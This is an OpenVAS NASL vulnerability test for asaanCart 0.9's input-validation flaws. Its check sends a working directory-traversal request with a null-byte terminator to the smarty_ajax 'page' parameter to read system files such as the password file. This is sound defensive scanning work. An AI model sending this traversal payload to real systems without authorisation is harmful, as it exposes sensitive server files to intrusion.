###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_asaanCart_52498.nasl 11355 2018-09-12 10:32:04Z asteins $
#
# asaanCart Multiple Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103590");
  script_bugtraq_id(52498);
  script_cve_id("CVE-2012-5330", "CVE-2012-5331");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 11355 $");
  script_name("asaanCart Multiple Input Validation Vulnerabilities");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52498");
  script_xref(name:"URL", value:"http://sourceforge.net/projects/asaancart/");
  script_xref(name:"URL", value:"http://asaancart.wordpress.com");
  script_tag(name:"last_modification", value:"$Date: 2018-09-12 12:32:04 +0200 (Wed, 12 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-10-23 11:48:15 +0200 (Tue, 23 Oct 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"asaanCart is prone to multiple input-validation vulnerabilities,
including:

1. Multiple HTML-injection vulnerabilities

2. A local file-include vulnerability

3. A cross-site scripting vulnerability");

  script_tag(name:"impact", value:"Exploiting these issues could allow an attacker to execute arbitrary
script code in the browser, steal cookie-based authentication
credentials, control how the site is rendered to the user, view files,
and execute local scripts.");

  script_tag(name:"affected", value:"asaanCart 0.9 is vulnerable, other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of
this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/asaancart", "/shop", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file( keys( files ) ) {

    url = dir + '/libs/smarty_ajax/index.php?_=&f=update_intro&page=' + crap(data:"../", length:9*6) + files[file] + '%00';

    if(http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
